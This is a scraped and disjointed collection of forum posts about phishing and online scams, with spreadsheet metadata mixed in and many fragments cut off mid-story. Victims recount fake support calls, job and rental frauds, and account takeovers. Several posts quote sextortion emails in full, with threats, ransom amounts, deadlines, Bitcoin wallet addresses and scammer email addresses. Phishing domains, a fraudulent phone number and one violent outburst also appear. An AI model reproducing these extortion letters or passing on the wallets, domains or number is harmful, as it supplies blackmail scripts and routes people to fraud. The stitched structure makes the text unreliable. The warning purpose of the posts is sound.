10 seconds later he comes on again - did he think his voice changed? But I was now talking to ""senior fraud officer"". He prompts me if I know about these terrible allegations that are ruining my Social Security?

Why yes, of course I do, I know all about it! You see, I got a call from Police Department 2 weeks go already and am being sued for $3m in damages by the department of the Interior for violating their Trust Law Certification Process, lol

Here is the email I received this morning, either way I would happily murder these people and eat their organs.

Hello!

As you may have noticed, I sent you an email from your account.
This means that I have full access to your account: On moment of hack your account has password: 707debd1916263e43a26

You say: this is the old password!
Or: I will change my password at any time!

Yes! You're right! 
But the fact is that when you change the password, my trojan always saves a new one!

I've been watching you for a few months now.
The fact is that you were infected with malware through an adult site that you visited.

If you are not familiar with this, I will explain.
Trojan Virus gives me full access and control over a computer or other device.
This means that I can see everything on your screen, turn on the camera and microphone, but you do not know about it.

I also have access to all your contacts and all your correspondence.

Why your antivirus did not detect malware?
Answer: My malware uses the driver, I update its signatures every 4 hours so that your antivirus is silent.

I made a video showing how you satisfy yourself in the left half of the screen, and in the right half you see the video that you watched.
With one click of the mouse, I can send this video to all your emails and contacts on social networks. I can also post access to all your e-mail correspondence and messengers that you use.

If you want to prevent this, transfer the amount of $758 to my bitcoin address (if you do not know how to do this, write to Google: &#8220;Buy Bitcoin&#8221;).

My bitcoin address (BTC Wallet) is: 17zmnmqEUCesNz6UgXGbRk7fKnu8iq1q2J

After receiving the payment, I will delete the video and you will never hear me again.
I give you 48 hours to pay.
I have a notice reading this letter, and the timer will work when you see this letter.

Filing a complaint somewhere does not make sense because this email cannot be tracked like my bitcoin address.
I do not make any mistakes.

If I find that you have shared this message with someone else, the video will be immediately distributed.

1689929582.0,Beware of This Kind of Phishing Scam: Stay Safe Online!,"I wanted to share a recent phishing scam or social engineering attack that seems to be making the rounds. Let's break down its possible components and discuss how we can protect ourselves from falling victim to such schemes.

1. **Random subject lines and numbers:** Scammers are getting smarter and using random subject lines to avoid spam filters and catch our attention. Be careful when encountering unusual subject lines, especially if they contain random numbers or characters.
2. **Random content and mass emailing:** The email's content may appear to be gibberish or include random numbers, making it harder for spam filters to identify. Additionally, scammers often send these emails to numerous recipients, increasing the odds of finding unsuspecting victims.
3. **Suspicious Attachment:** One red flag to watch out for is an attachment file (calendar or html file). Scammers could attempt to trick you into downloading and opening a malicious file that could lead to severe consequences.

# This attack could involve phishing or malware distribution.

1. **Phishing:** If you click on a link within the attachment or reply to email, you might end up on a fake website that looks remarkably similar to legitimate service. The attacker's goal is to steal your login credentials or personal information.
2. **Malware distribution:** Opening the attachment file could activate malware that might compromise your device, steal sensitive data, or cause other harm.

# Tips for Protecting Yourself:

1. **Avoid clicking suspicious links and downloading attachments:** If you're unsure about the sender's legitimacy or the email. Legitimate organization won't ask you provide sensitive data through email.
2. **Guard your personal information:** Be cautious about sharing personal information, login credentials, or financial details via email. Legitimate organization won't ask you to provide sensitive data through email.
3. **Report suspicious emails:** If you come across a suspicious email, consider reporting it to your email provider. Reporting such incidents helps others from failing into the same trap.
4. **Immediate deletion:** If you receive an email that raises suspicious, don't hesitate to delete it immediately. Move it to the trash permanently.

Phishing and malware attacks are becoming increasingly sophisticated, but with the right knowledge and caution, we can protect ourselves and from falling prey to these scams.

Let's keep each other safe online!!!

1687291810.0,Poisoning The Well - Should I?,"Good day, all. I am curious regarding your opinions on poisoning the ""phishing"" well. That is, what are your thoughts on flooding a phishing attempt with fake, though believable, information. For example, taking a Google Form phishing for login credentials and flooding it with thousands of credentials that won't work. 

Almost like what has been described in this article ([https://www.cosive.com/blog/canarycredentialsintro](https://www.cosive.com/blog/canarycredentialsintro)), but with less emphasis on making accounts that the phisher will want to use. That is, focusing less on creation of real accounts that signal a breach, and more focus on submitting so many fake account credentials that it becomes impossible for the phisher to distinguish between real and fake accounts.

What are your thoughts on this? Would it work? Would this help obfuscate real credentials of real users? Or would this just be a waste of time for the person deploying the poison? Thanks in advance.",phishing,984,147,28,1

I clicked it, and I noticed the url was rather weird so I closed the fb app browser tab within a few seconds. The page was still loading (entire page was white) when I closed it. 

Going into that profile, i noticed more posts resembling the one I clicked and scrolling deep in the comments I saw people say that this profile had been hacked.

I'm not going to check the content of the web page. just the URL.

1646712174.0,I've had my Instagram account phished and I'm having troubles getting it back,"I have no idea if this is the appropriate place to ask for this, but here we go. This is also posted to r/advice if anyone sees the double and has a bout of deja vu (unlikely). It's my first time posting anything this serious, so go easy on me.

Yesterday I received an odd request from a friend on Instagram: they had trouble logging on to their account and wanted to send a verification my way. Stupidly I didn't ask any questions or even think twice about it, and only realized something was wrong after it was done.

The message read as follows:

""I was trying to log in to my Instagram page on my new phone and it asks me to find someone to help give me a code, Instagram gave me suggestions from two friends and you are one of them, the other person is not online . Could you help me receive the code please?""

Afterwards I received a text message from Facebook, which I sent a screenshot of to what I thought was my friend. I didn't think anything of it until I saw a discussion in a group I'm in regarding a similar phishing attempt. I realized what happened then, but it was too late...

My password, email and phone number were all changed, and none of the alert emails I got from Meta did anything to mitigate the damage. I've gone through all the suggestions given to me when I hit the login button and submitted like 6 or so video selfies, but all have been rejected to date. For some reason none of the other support options work, and the new phone number is a nonexistent hodgepodge of numbers. My only solace is I was able to use my other social media to warn my friends so they don't get hit with the same issue.

There's nothing really valuable on my account, since it's just used for talking to friends and browsing, but I have 3 years worth of memes saved on it and some of those conversations aren't meant for strangers to see (nothing illegal/immoral, but definitely heart to heart stuff).

Obviously didn’t open the attachment but I have never had a phishing email get past my spam and include my full name, it makes me wonder if they managed to get any of my passwords.

A lot of others online have reported that they also received the same email and that our information would be sent to the dark web if said institution did not reach out to them to negotiate something. I already emailed the application website and have not received a response. People were saying it is nothing to worry about only to not click the link while others said they clicked the link and they were screenshots of people's personal info and other institutions they were able to breach. Other people were saying it was real so I figured I would ask your thoughts.

I checked with zoom, and the meeting code given is a valid meeting.

I could imagine a couple of things going on here: 

1. The link doesn't actually go to a zoom meeting, It just has that to make people more likely to click on it. I doubt this is the case since the email wasn't about zoom to begin with.
2. The link does go to a zoom meeting and they have some zoom exploit that they are going to use. Seems unlikely and would be dangerous. Also why would they include the redirection domain in this case? for click tracking?
3. The link does go to a zoom meeting and something/somebody on the call is going to try and convince me to do something more.

are these trojans that activate on download and opening of the pdf or do they expect people to download the pdf and then click ""log in"" on that? Seems to make even less sense than the regular phishing mails no?

I don’t know how many of y’all have received this fake email pretending to originate from Apple.

It was sent to my email address which is linked to my Apple account, when you read the email carefully word by word you’ll find a few spelling errors, It asks you to click on the green button to “Update Account“. This is a phishing attempt by someone so don’t click on it. Also when you click on the sender (Apple) the origin address looks very sketchy.

1571402472.0,Report: Careful when you loose an iPhone,"I use Airbnb so people comes to my apartment, I went on vacations for a week, I decided to block my calendar so that I didn’t host anyone because my apartment was going to be alone and when I came back I noticed that my second iPhone was stolen....

Two days later I started receiving several sms messages telling me that my phone was turned on, connected to the internet, located, “changes were made to the phone”, etc... with a link to view the phone on the map.

The url was http://appIeconnect.la/56556

Notice that there is an uppercase letter, when you open the site it becomes lower case, the url in reality is http://appieconnect.la/56556

The url they send has a number that identifies you and ONLY works when someone is attacking you.

Because the link only works when someone is attacking, note that google chrome, safari and opera didn’t recognize the site as suspicious and didn’t raise an alert because they don’t use SSL. 

When browsers start raising alerts, they change the url. This is another example: http://icloudfound.com/56556

They are using amazon web services SMS service, so messages are coming from US and (if you don’t live in the US) also from local numbers, many services use that service to send two factor authentication codes, so truecaller and sms filtering apps didn’t recognize the sms or phone numbers as suspicious. Sms messages also are in the language you speak, in my case Spanish, but in that moment I didn’t realize that I have all my devices and services in English and should get the sms in English. 

The sms number was sent to my personal phone number, not to the number of the SIM card that was on that phone, the sms includes iPhone model, capacity 

When you open the site you see a PERFECT iCloud site, with proper colors, perfect animations, responsive (works great in phones and desktop browsers), perfect canvas.

They ask for a six digit code, I didn’t know what they’re asking for, so I called Apple. Important thing to note here: Apple didn’t tell me that they do not send sms messages when a phone is found. The site actually was asking for my pin code... they don’t tell you, so in that state of mind trying to do as much as you can to screw the thief, you start typing numbers and trying to guess in order to see the map... one of the many tries could include sensitive numbers you use such as... the pin code.

I think someone is selling “phishing as a service” they asked me for my pin because they needed it, but the “customer” may want your iCloud account so the site could ask for id and password if they need it. 

I work at the IT industry, so trust me: the attack it is very well planned, very well made. 

I’ll paste the sms I got

1571052311.0,"Signed a ""lease agreement"" then cancelled in suspicion of scam","Hello, reddit. I am not sure this goes in this sub, but here goes.

I've been urgently looking for a new place to stay and put up ads on specialized websites. I live in Germany and this dude from the US offers me his flat in Berlin. Since he isn't present in the city, I couldn't meet or get a look at the unit in person until I've sent him a damage deposit payment and he's sent the house keys from the States. He asked for some info on me (Name, marital status, current address, phone number, skype username) and made me sign a ""lease agreement"", which looks legit enough. He sent me pictures of the place and out of excitement, I signed the document.

It was only when he gave me his bank account details (which he claims are his lawyer's bank details) that I became suspicious. I tried reverse searching the images he sent me and nothing came up. The address is real, the law firm he claims is involved is real. The thing is, the address of the bank account he sent me probably isn't, at least that's what it looks like on Whitepages. I've emailed the law firm to ask for confirmation of their involvement.

At first they asked for a bitcoin payment but I said that was confusing so they gave me their Western Union info including: First Name, Last Name, Address. Can I report them somehow using this info? Are they one step closer to being caught since they gave me this info?

EDIT: to be clear, I know this is a total scam and they actually have nothing on me. I'm positive of this for MULTIPLE reasons: they sent it to my work email which has no person associated with it, I have no webcam, I definitely did not masturbate to porn at work (or anywhere, for that matter (recently, at least (TMI?))).

Here is the text of the original scam email:

*THE SECOND WARNING*

*You ignored my first email, but I am not going to ignore your mistakes, don’t be stupid and do as I say. I know your passwords (check this email subject), I know about your daily life, your internet activities and you know nothing about me, and you must be wondering why you are getting this email, right? I installed a malware on the adult (porn) website and guess what, you visited this website to have fun (you know what I mean!). While you were watching the porn, your web browser started functioning as an RDP+keylogger, which gave me access to your display screen and camera. Right after that, my software collected all of your contacts from your Facebook account, Messenger account, and email account, then, I created a double screen video. The first part shows the video you were watching (you have a nice taste lol), and the second part shows the recording of your camera (it is you!). You have two options -*

*1. First option is to ignore this email. In this case, I will send the recorded video clip of yours to all of your contacts lists, associates and social network friends. just imagine the humiliation you will feel from this. Don't forget that this can also affect your relationship as well.*

*2. Second option is to pay me $2000. Since you decided to ignore my first email, the price is now $3000. We will call it a donation. In this case, I will right away delete your video and all of your information I have about you (including your contact lists) and you will never hear from me again. You can continue your daily life like this never happened.*

*You will make the payment via bitcoin. If you do not know about bitcoin, search Google for ""how to buy bitcoin"". You can also get the bitcoin from sites like Bitstamp, Coinbase, Kraken, Bitcoin Atm, Localbitcoins, etc. Bitcoin (i.e. BTC) address to which you need to send $3000 is - 1AjJCkBTA8aPDLLCpW6Am1z1FKUEroQzeT*

*Send exactly 0.291578 BTC to my address so i will know is you:*

*1AjJCkBTA8aPDLLCpW6Am1z1FKUEroQzeT*

*(copy it and paste - it’s case sensitive)*

*If you are thinking to go to the police, good luck,I am from russia and I have taken every step to make sure that this email cannot be traced back to me. You have 72 hours to pay me. I have a special pixel in this email, and at this moment, I know that you have read this email.*

*Contact me on this email address* [*chupachu147@gmail.com*](mailto:chupachu147@gmail.com) *copy to* [*manpachu147@aol.com*](mailto:manpachu147@aol.com) *with this subject: 012VIPERMARVO- RESTOREKEYPC4102934 After this steps you will receive through email the key and a decrypt tutorial.*

*Remember to send the exact amount as above! This way I will know it’s from you. Do not be angry at me. This is just my job, and you are not the only person I caught.*

*Be angry at your fantasies - if you didn’t visit those sites for adults you would have no problem.. but now...*

1565532428.0,HBONOW Phishing,"My mom got me involved in this one last night. 

She was trying to set up my HBONOW account on her Roku and went to the wrong website to type in the activation code. When it didn’t work, they said they needed to call me. I figured they just needed to verify that it was my account, especially since I had signed into HBONOW on my Smart TV earlier in the day, or that I might have to upgrade to a different tier for multiple screens, like Netflix. I was in the middle of something and was trying to move it along, so I wasn’t too suspicious until it got really bad. 

The caller immediately launched into a spiel about “a one-time service fee of $29.99” to activate the account on the Roku. I asked why I needed to pay thirty dollars for a service that I’ve been using for months at $15. She told me not to worry, it was a one-time fee, just for today, can I go ahead and start that for you? I asked again exactly what the fee was for, and she said something to the effect of “independent service fee for the Roku.” My mom was texting me the whole time this was happening asking for updates. I said alright and gave her my bank card info. 

She seemed to have some trouble understanding me, as I had to repeat my card number several times (I have a confusing card number with some repeating digits, so I’m kind of used to this when I give my number over the phone) but I got a little wary when she repeated my card number back to me to confirm. Usually, I’ve had people say that they can’t repeat the number back to me for security purposes, but can I confirm how many X’s appear, or have me repeat the number. 

After confirming my bank card number, she asked for my HBONOW password. I really started to get suspicious here, but I figured it would be over soon and I could get back to my project. I gave her what I thought was my password (I use two or three passwords, so it’s always gotta be one of those) but it turns out it was wrong. This prompted her to ask me to reset my password. I said “you know, I don’t think that’s necessary, and I really don’t want to continue this right now.” She insisted we were almost done, that she had already sent me the email link to reset my password, just go ahead and reset it to this phrase. I said I hadn’t received an email and that I didn’t want to continue this. At this point, the call dropped. 

The call had been dropped several times throughout this ordeal, but she always called me back immediately. While waiting for her to call me back, my mom and I determined that this was a phishing scheme and that if she called me back, I would tell them to stuff it and leave me alone. I also got the email to reset my password, but did not click on the link. 

She called me back and before I was able to tell her that I was done with her bs, she said “Why don’t you just give me your gmail password and I’ll sign in and reset the password for you.”

Now they’ve made me angry. 

I said there was no way in hell I was going to give them my Gmail password, I did not want to pay any fee and I was done with this conversation. She transferred me to a “technician” who started from the beginning, with the $30 service fee. I told him that I would not be giving him any more information, that someone had just asked me for my gmail password and that I wanted to cancel everything (I wasn’t sure what “canceling everything” would accomplish, but I was fed up and just wanted to shout at someone.) 

He transferred me to a “Level 3 Technician” who again started from the $30 service fee. He asked me if I wanted to go ahead and start that process and I said “absolutely not.” He confirmed that I did not want to pay the fee and regretfully informed me that if I didn’t pay, they wouldn’t be able to set up the service. I said that was fine with me and we hung up. 

They hadn’t taken any money out of my bank account at that point, but on the advice of my boyfriend, I cancelled the bank card and will be calling them on Monday to get a new card. I also changed all of my passwords. 

Not sure if I can report this somewhere or if there’s anything else I should do just to be safe, but I’m sure that they’re not just doing this for HBO accounts.",phishing,4183,820,72,1

1510168772.0,Phishing Program Checklist. After 5 years of managing phishing training programs here is what I've learned:,"1. Agreement
    1. This should involve a small stakeholder “team” from various departments that all give support and act as liaisons for the effort: Infosec, IT (mail team & support team), Legal, HR, Corp Comm, Executive team. 
2. Transparency
    1. This should not be a “secret” project. The success of the program in building trust with your end users and changing behavior rely heavily on the fact that they do not feel “tricked” or they can’t trust the infosec team.
    2. Clear communication on what the program is, why the company is doing it, and how the users will be affected (what should they expect at every turn).
3. Tested processes.
    1. Is there a reporting button that needs to be installed?
    2. Do you have a simple email address for users to report to?
    3. Have you whitelisted all potential domains for education purposes?
        1. There is a difference from whitelisting email servers with your exchange team and whitelisting domains and URLS for ALL of your filters. I’ve seen some companies with 5 layers of filtering that needed to be completed to ensure proper email delivery and education experience.
    4. Test to IT first, and then expand to a slightly larger group across multiple forests or trees in the AD environment to make sure nothing was missed.
4. Communications
    1. Stakeholders: (initial program announcement, separate comm; 48 hours prior to launch as reminder) this announcement should introduce them to the project, verify the goals of the project, and identify what their role is within the project. Many of them will have team members reaching out to them with questions, so they need to have all the info to answer those questions. If you let them provide their own answers - your program will turn into a crapshoot quickly.
    2. Security Stakeholders (48 hours prior to launch): these are the teams that make the program run smoothly. This will be those on IT support, exchange admin, infosec & IR teams responsible for blocking links and spinning up response processes. They need to be aware what is coming so they can response appropriately as calls come in. They should have relevant info on the campaign (Subject, sender, date/time, content)
    3. Users: they should receive two communications generally - one initially announcing the program. This can be two months out from kickoff. They should receive another message 2 weeks prior to first campaign launch. This message should remind them of the program, and what they should do.
5. Clear and simple guidance
    1. You are training your users, not testing them. The goal of these programs should be to change user behavior, not make them feel like they failed something. Positivity.
    2. What users need to know:
        1. How to report stuff. Do you have a clear and simple method for them to report phishing emails (Outlook button? Simple email address to forward as attachment?). It needs to be a single, simple action to be successful. 
        2. What to stuff to report. Anything? Don’t make them know the difference between SPAM and Phishing. They should be reporting anything that feels “weird”. Your teams should handle the SPAM stuff via properly tuned applications and architecture.
    3. It’s okay if they give each other a heads up about the program. While we don’t want to do it, if it were a real phishing email that is what we would want them to do. So while it is tempting to scold when they do this, you need to encourage them that the action they took was correct.
    4. IT Support and stakeholders. They need to know how to respond to users inquiring about whether or not its a “test”. Regardless it should always be the same response - “yes this is a phishing email, please report it via…” and constantly reinforcing the desired behavior and positive acknowledgement that they identified a threat.
6. Metrics & Reporting
    1. Everyone wants the click rate - but this is mostly bogus, so don’t fall into that trap. Its a metric senior leadership will want to know - but having them understand the lack of strength in the actual reporting is key. This data point does not tell the whole story (difficulty, outside factors like time of year, vacations, holidays, trending media coverage, etc.). 
        1. Accepting the click rate SHOULD vary from 7% - 35% consistently. If you are consistently hitting below 10%, you are failing to train your users properly.
    2. Focus on getting report rates. # of users who reported. This shows behavior change consistently across campaigns and shows program effectiveness.
        1. This also allows you to empower your IR team - if you are having 50% of your users reporting emails, they can reduce their response time to take action. Executives love that shit.
    3. Role based metrics - break out into interesting stories: Executives, People Managers, Users, Contractors, Temps, IT/Privileged Accts.
    4. Average time to report sounds fun but isn’t a clear number - you have no idea how many people are in meetings for 3 hours at a time before they get their email. Too many outliers.
    5. Region - if you’re global keep it to  bigger buckets (North America, EMEA, APAC)
    6. Employment time. This is good to show training effectiveness for new hires versus long term and can provide opps for awareness.",phishing,5304,890,133,1

On the day of 25/03/2023 13:08:23
, I penetrated your device's operating system and seized total control of your account ""my name
"". I've been keeping a thorough watch on you for a long time.

I've introduced software into your system that grants me dominion over all your devices.
Through the malware I've deployed, I've gained control over your device's primary functions such as your microphone, video camera, keyboard, and display. I've moved all your personal data, photos, and browsing history to my servers. I now have access to all your messaging apps, social media accounts, emails, synced data, chat histories, and contact lists.
It's quite interesting what I've found about you!

Intriguing thoughts flooded my mind about the applications of this data...
A fascinating idea has recently come to mind: using artificial intelligence to create a split-screen video. On one side, you're engaged in masturbate  , and on the other, you're interacting with an intriguing website. Videos of this nature are rapidly gaining popularity.

The result? Totally knocked my socks off.

With a single click, I can distribute this video to all your contacts through email, social networks, and instant messengers. Furthermore, I could expose access to all the emails and messaging apps you use.
Additionally, I found a plethora of intriguing materials that I could disseminate online and share with friends.

If you don't want me to do it, send me 1250 $ (US dollar) to my Bitcoin wallet.
My BTC address:
bc1qnurm5wx3r7enmvnn087g0e3u9mwepw8jn6d035

If you're unfamiliar with how to fund a Bitcoin wallet, you can always use Google for help. It's quite straightforward.
Upon receipt of the funds, I will promptly eliminate all unwanted material. Subsequently, we will go our separate ways. I pledge to deactivate and remove all malware from your devices without fail. You can have complete confidence in me; I stand firmly behind my words. This agreement is fair, particularly given the significant time and effort I have dedicated to tracking your profile and traffic.

You have exactly two days (48 hours) from the time this letter is opened to make the payment.

After this period, if I don't receive the specified amount from you, I'll distribute access to your accounts, visited sites, personal data, and edited videos to everyone, without any warning.

Remember. I don't make mistakes. I would advise against taking this lightly; I have many resources at my disposal.

There's no point complaining about me because they can't find me. Formatting the drive or destroying the device won't help because I already have your data.

Any responses to this email will not be reviewed or seen, as it is not a personal account and does not receive replies.




Good luck, and don't let this upset you!

Each person has their line of work, today you just happened to be on the wrong end of mine.




P.S. A word to the wise - in the future, ensure you follow the safety norms of the internet and abstain from dodgy websites.

When following the link to add an external account there is a pop-up window that resembles Plaid's external acct API. However Stripe confirmed to me that they are using their own code for this element.

There is a ""bank"" listed under the name Lili, which you may recognize as the popular mobile banking app featuring a yellow and black logo. The form simply displays a field for your username and password, and then a link at the bottom ""continue to financial institution"" as well as ""Submit."" 

Following the former will redirect you to the domain ""lilibank.com,"" which appears to be some sort of real estate company based out of Canada. However, there's little to no actual information on this site. And the few listings I attempted to verify were not even for sale. The site also has no real information on who controls it or how to contact them, lots of 404's etc.

I received an e-mail from PayPal saying that I had a request from someone for a large sum of money. The e-mail was legitimately from [PayPal.com](https://PayPal.com). I went to the website manually and checked my dashboard. It had the request. I clicked ""Cancel"" and it also said to call a phone number to report a fraudulent charge. This number is illegitimate and is 1-888-221-1161 (don't call).

I called to report the charge. There was no annoying customer service robot (Red Flag 1). I explained the situation to the person. He then told me someone has access to my account. I explained that a charge hadn't happened, that someone had just requested money from me. I didn't get a straight answer (Red Flag 2). He then tried to get me to download some software that allows VPN remote access (Red Flag 3). I didn't download it or install it. He instead told me to go to a website: [phelp.online](https://phelp.online) \- don't go to it. I stupidly did, but didn't enter any information, immediately closed it, and hung up on him.

I found a different phone number on the PayPal website, called them, and reported it. What I stupidly hadn't realized is that the phone number I originally called was written as a note by the requester, not an official PayPal comment \*facepalm\*

Anyway, I didn't give out any information, download anything, or anything like that. But I did go to that stupid phelp website very briefly. I'm on a Mac, all of my software is up to date.

I've done some digging and read that clicking on these types of links just lets the scammer know the email address is a good target for future scams. I'm hoping this is all it is.

Basically saying that the hacker has hacked my camera and obtained videos of me masturbating to porn videos and plans to send it out to all my contacts, with the porn videos playing simultaneously next to it.

A quick Google search of the text showed that (kinda suspiciously) a blog post on a very sketchy looking antivirus advice site with links to antivirus programs etc, spoke about the same scam, exact wording and all. However it was posted just an hour ago...I almost think the antivirus site is part of the scam too.

Anyway I am sure it is still a random scam and all, but I still shat my pants a little because there *is* a part of the email that says:

*Your password at the time when I got access to your email: \*\*password\*\**

And it was indeed a password I used long ago, although I don't remember on which accounts. Certainly not my main e-mail for the last 10 years anyway.

Is there any reason to be worried about this? I repeat that it's a password I haven't used in years, but it was kinda scary for me to see it mentioned in this scam attempt....",phishing,1129,212,25,1
1649621447.0,Is Anyone Else on Reddit Getting Phished by Fake Accounts?,"I've been getting notifications of fake accounts following mine.  I've clicked on the links to each user's page every time, and I've noticed a pattern with the three accounts:

1. The user claims to be a conventionally attractive young woman looking for sex.  Their bios often talk about how ""wet"" and thirsty they are, and they even use photos of young women posing provocatively, usually in revealing, tight-fitting clothing or just their underwear.
2. None of these users have any posts or comments in their history.

Even if these were real girls looking to hook up and get some action, I'm still not interested in them following me right off the bat the very second they've freshly created a Reddit account.  It just doesn't seem natural to me that someone would follow a complete stranger without first finding them on a certain subreddit, most likely one dedicated to hooking up, which I am not at all part of.

I would feel bad if I had accidentally blocked a real person who thought I was a completely different user with a very similar username, but unless that person is either incredibly bad at communicating or giving out a fake username because he's a serial cheater, it's highly unlikely that this is the case, considering it's happened more than once.  I'm getting very annoyed at this point and just want this to stop.

Also, in case it has anything to do with it, I also got phished through my text messages a couple of times from two different phone numbers pretending to be the same thirsty redhead who claims to have gotten a wrong number from a guy she hooked up with.  Further details include racy selfies and even nude pics, oblivion to the meaning of the word ""no"" that would make you think this woman needs mental help if she's even a real person, and pertinent existence that I'm a guy with a ""huge cock,"" even after I told her several times that I'm a straight woman who is not interested.  Also, the second time around I started getting kind of rude because I was just getting tired of having my privacy breached by either a mentally unwell woman who refused to let go and consider how her actions were affecting both herself and others or either a catfish or phishing AI.  The three above incidents that have happened to me here on Reddit reminded me of this, which is why I'm mentioning it, as I think there's a possibility that they're connected.",phishing,2378,422,56,1

1628701461.0,Potential Instagram Phishing,"My friend texted me this, and I immediately knew this was suspicious.

I was bit curious to what it was, so I went on my VM to open the link using Microsoft Edge. It redirected me to an Instagram login page that looked pretty real. Not wanting to use my main Instagram credentials, I signed up using an alternate email address. It asked for a email verification, and I gave it. But I stopped the sign up when it asked for a phone number for an SMS verification. Unfortunately, that process didn't have a skip function, which by itself seemed weird to me.

After this halt on my VM, my curiosity got the best of me, and I opened up the link on my main PC. However, it didn't redirect me to the login page. It was stuck loading. There was nothing downloaded, or asked for permission for anything. I'll change my main Instagram's password, just in case though.

I'm still puzzled on what the link actually does. The website I was redirected to seemed official. The URL didn't contain anything weird. So I'm hoping someone can shed a light to this. Thanks for reading.

Many of the automated phishing checking websites don't allow this and don't recognise it as a phishing page.

I checked my email today and noticed that I had received an email from coinbase asking me to verify my email address. As I didn't sign up for the account, I assumed that someone had used my email (either on accident or maliciously - dont know) to sign up for the account. Because I didn't sign up for the account, I left the email alone and continued to check my other emails. The problem is that I also received another email from coinbase that stated my account had been verified which has me concerned. When I checked my email, both were unopened. I've checked my email account  and only my devices are active and connected to the account and there is no email forwarding, filters, etc. When I go to coinbase and try to recover my password, I don't receive any emails from coinbase, just like if I didn't have an account there.

I get lots of emails like this, with a simple query or statement. The three shown here are typical. (I've attached the original source for one of these.)

What's the point of these emails? I delete them, but I'm curious as to why I get so many, and why Google doesn't catch them as spam messages.

I've included the full headers below for the last message, just in case it helps.

So I am currently seeking jobs on Indeed and my profile is set to private as well as my resume.  I then get a message on Indeed from a recruiter that has an opportunity by the name of Alfredo Gruspe from Thorkelson Ltd, looking to fill a chat specialist position in that company (I get these messages all the time.)

So I agree for my email to be shared. A day or 2 later I receive an email from another person from the company an HR Manager by the name of Loretta Shaffer saying how she looked at my profile on indeed and says there's an opening for an Online Service Manager she'd like to tell me more.

2 minor red flags I did not pay heed to in the email when greeting me she referenced my email, and she's emailing about another job. Anyways she explained the position and another thing I didn't pay attention too the duties were somewhat vague and didn't make sense. I googled the company they had a website looked kind of legit didn't really pay much heed because they did not ask for any sensitive information or anything so continued she said if I am interested

I need to make an application on the website which I did this is where I kind of slipped the ball I inputted my name, address, and phone number, and age. But all of this is on my resume so did not think much except the age. Anyways the biggest red flag was the when I got the offer letter it did not make sense that a company would offer a position without a phone interview or video so I ended all communication with them and will be reporting to the fraud authorities in Canada. Hopefully they are not able to do much with the info I gave them but I will be monitoring my Transunion and equifax monthly to be certain.

Moral of the story if it is too good to be true it probably is fake.

We ask that you do not open new accounts as any new order you place may be delayed. We appreciate your patience with our security measures. Thank you for your attention. Best regards,
Amazon Service Team"" 

The email included a link that said ""Check Now"". Now, my Amazon account has been locked for the last six months with no explanation and I've been calling their customer service non-stop.  There had been no response and I thought the phishing email was the response I had been waiting for.  So, being the moron that I am, I clicked it on my laptop because I saw that the email was from ""no-reply@amazon.com"" which was really just the display name and the address was a sketchy ass email.  I was greeted by the Google Chrome ""Dangerous Website"" warning and my fucking stomach dropped.  I immediately clicked out of the link (no forms filled out at all) and cleared my browser history. I have McAfee Total Protection installed as well as the standard Windows antivirus.  Usually McAfee will scan any downloads made automatically, and I'll receive a pop-up letting me know that it's been scanned.  No pop-up was shown, and I didn't see any downloads in my File Explorer.  I disconnected from my wifi and did a Quick Scan with McAfee, which detected no virus.  I am currently running a full scan, but I'm awaiting results.  

As you can probably tell I'm pretty stupid with computers, but I know nothing about malware/viruses/ransomware/spyware except they scare the shit out of me.  I'm not too worried about any accounts of mine getting breached since I didn't fill out any forms (I'm certainly going to change sensitive passwords anyways).  But I'm worried about any hidden malware that can be on my computer now.  What is the likelihood that this link click has resulted in the hidden download of malware? Is there any major steps I'm missing that I should take for harm reduction? And also, when can i be pretty sure that my computer is safe and my accounts are safe? I don't want to be blindsided by this like half a year from now.
I really hope I'm overreacting right now but I have absolutely no idea what to think, my mind is racing at a million miles an hour right now.  Thank you, and apologies for the wall of text

I had a friend approach me on FB messenger asking if I could help them retrieve their code as their phone was messing up. I said yes, gave them my mobile number and the codes that they sent to me (For gmail too).

They signed me out of my accounts and I started to suspect they were hacking me so I confronted them and they replied saying that they think they know what's going on and to give them 1 sec to fix it. I immediately got logged back onto FB and Google and they somehow earned back my trust. At this point I still think the hacker is my friend.
They go onto saying that they're still trying to figure it out on their account and to DL Skype so we can talk if it boots me out again. 

It's getting late and I have to go to bed so I tell them to sort it out and msg me in the morning if it works. They're adamant that we get it sorted out quickly now, as they have a ""super busy day tomorrow"". So i go onto Skype and they add me, I get booted again and they call me but there's no voice or cam. So they hang up and tell me to call, but this time it's just my voice and my camera on. I kept most of my face out of the camera as I didn't really know why I needed it on... 

I asked what was taking so long for them to connect to the call, and they said its probably a reception problem.
They continue on to say ""why don't you read this while we wait"" and they copy and pasted a threat and a nude photo I took years ago. I didn't get to read all of the threat, when I called out for my partner the hacker deleted the threats and messages cursing me out for telling my bf. I responded saying I didn't care, and that I was going to bed. And they switched from a malicious tone to a relaxed tone saying ""it's just a joke"" ""Night haha"" 

I have reported it to cyber security here and have factory reset my phone. 
I'm concerned with what they can do with the information they have received. I can't delete or reset any accounts as they have my mobile number and they've already reset everything i can think of.

I was phished by these people this morning, just want to put the word out and warn others. They offered $20/hr for an ""assistant"" job on Indeed and emailed me with an offer. Without an interview or so much as a phone call, I get an employment contract (Which I hope they can't do anything with because I signed it like a fool).

They then quickly set up a meeting on telegram (I posted the conversation). Before the meeting I got a call from them which seemed genuine, basically just generic questions and going over my resume. Then I'm told to wait until they're ready to conduct the telegram meeting where they break into a whole tirade about Ethereum. The idea is that they want me to set up an account so I can preform my duties, which I guess are simply making domain purchases with company money for their clients.

They wanted my ID with a picture of myself self, which sounds like identity theft in the making. Normally you should fill out information like this on a proper application form. When I asked for one they said they'd look, when I asked where they were located, they went silent. Their plan probably involves asking for more info if you indulge them. The ethereum account may eventually require some activation, who knows, I didn't get that far. But they'd probably try to link it to your person and either bleed you or commit fraud under your name.

According to their website they operate from the Guinness Business Center in Vancouver (which is conveniently a rental space). I attached the face of the woman conducting the orientation in case someone tries to find out about this company using a reverse image search (I couldn't find her though). And a search for kannis group is much more likely to yield results for a 2 employee company in bolivia than this vancouver based one.

I ignored it, stating in my head that I would deal with it later. However, when I opened up the email on my PC, something just felt off for me. So I did what any sensible person would do and instead of clicking on the link to ""verify my identity"" I went to PayPal itself and tried to log in. And what do you know, I can log in just fine with no problems.

